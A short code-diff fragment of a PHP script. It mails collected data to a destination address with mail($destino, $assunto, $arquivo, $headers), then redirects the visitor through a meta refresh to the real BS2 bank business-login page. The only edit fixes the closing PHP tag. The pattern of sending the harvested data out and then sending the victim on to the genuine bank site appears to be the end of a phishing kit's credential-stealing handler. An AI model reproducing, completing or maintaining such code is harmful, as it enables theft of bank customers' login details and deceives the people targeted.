@@ -27,4 +27,4 @@
   mail($destino, $assunto, $arquivo, $headers);
   
   echo "<meta http-equiv='refresh' content='0; https://app.empresas.bs2.com/bs2/autenticacao?_ga=2.167732662.966602958.1659551333-1655799592.1658522621'>";
-  >
+  ?>
